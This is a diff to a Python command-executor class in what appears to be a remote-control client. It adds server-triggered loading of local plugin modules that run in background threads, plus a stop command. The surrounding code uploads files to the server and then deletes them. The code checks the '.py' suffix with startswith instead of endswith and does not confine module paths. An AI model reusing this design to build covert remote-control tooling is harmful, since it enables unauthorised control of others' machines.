@@ -1,9 +1,12 @@
 import contextlib
+import glob
+import importlib.util
 import inspect
 import io
 import json
 import os
 import subprocess
+import threading
 import time
 
 from client.util.decorator import desc, params, enclosing, require_admin, require_integrity
@@ -25,6 +28,7 @@ class CommandExecutor:
     def __init__(self, socket):
         self.socket = socket
         self.command_id = None
+        self.imported_modules = {}
 
     def execute_command(self, command_id, command):
         self.command_id = command_id
@@ -130,6 +134,78 @@ class CommandExecutor:
         self.send_to_server(1, f'Preparing to send file, length is {os.path.getsize(filename)}', 0)
         self.socket.send_file(self.command_id, filename)
         os.remove(filename)
+
+    def dynamic_import(self, module):
+        # 获取模块路径
+        module_dir = os.path.join(get_working_directory(), 'client/util/modules/')
+        module_path = os.path.abspath(os.path.join(module_dir, module))
+
+        # 检查文件是否存在
+        if not os.path.isfile(module_path):
+            raise FileNotFoundError(f'File does not exist: {module_path}')
+
+            # 使用os.path.splitext()函数分离文件名和扩展名
+        module_name, _ = os.path.splitext(os.path.basename(module_path))
+        # module_name = module[:-3]
+        # 导入模块
+        spec = importlib.util.spec_from_file_location(module_name, module_path)
+        module = importlib.util.module_from_spec(spec)
+        spec.loader.exec_module(module)
+
+        # 获取主类
+        cls = self.get_main_class(module)
+
+        # 实例化类并设置参数
+        instance = cls.get_instance()
+        instance.set_args(self.socket, self.command_id)
+
+        # 缓存实例化后的类对象
+        self.imported_modules[module_name] = instance
+        return instance
+
+    def get_main_class(self, module):
+        # 使用inspect.getmembers获取模块中的所有成员
+        for name, obj in inspect.getmembers(module):
+            # 判断是否为类，并排除抽象类
+            if inspect.isclass(obj) and not inspect.isabstract(obj):
+                return obj
+        return None
+
+    @desc('Load module and execute in a new thread')
+    def load(self, arg):
+        if not arg.strip():
+            modules = []
+            module_dir = os.path.join(get_working_directory(), 'client/util/modules/')
+            for file in glob.iglob(os.path.join(module_dir, '**/*.py'), recursive=True):
+                modules.append(os.path.relpath(file, module_dir).replace('\\', '/'))
+            return 1, '\n'.join(modules)
+        if not arg.startswith('.py'):
+            arg += '.py'
+        self.send_to_server(1, f'Preparing to import module {arg}.', 0)
+        instance = self.dynamic_import(arg)
+        if instance:
+            self.send_to_server(1, f'Imported successfully, current imported module: {list(self.imported_modules.keys())}.',
+                                0)
+            self.send_to_server(1, 'New thread being started...', 0)
+            thread = threading.Thread(target=instance.run)
+            thread.start()
+            self.send_to_server(1, f'Successfully started the thread with the name {thread.name}.', 0)
+            module_name, _ = os.path.splitext(os.path.basename(arg))
+            self.send_to_server(1, f'Execute the command "stop {module_name}" to stop.', 0)
+        else:
+            raise Exception(f'Failed to import module: {arg}.')
+
+    def stop(self, arg):
+        if arg.endswith('.py'):
+            # 使用切片去掉最后的 .py 部分
+            arg = arg[:-3]
+        if arg in self.imported_modules:  # 去除结尾的.py
+            instance = self.imported_modules.get(arg)
+            instance.stop()
+            self.imported_modules.pop(arg)
+            return 1, 'Interrupt signal sent.'
+        else:
+            return 0, 'The module has not been imported.'
 
     @desc('get information')
     def getinfo(self):
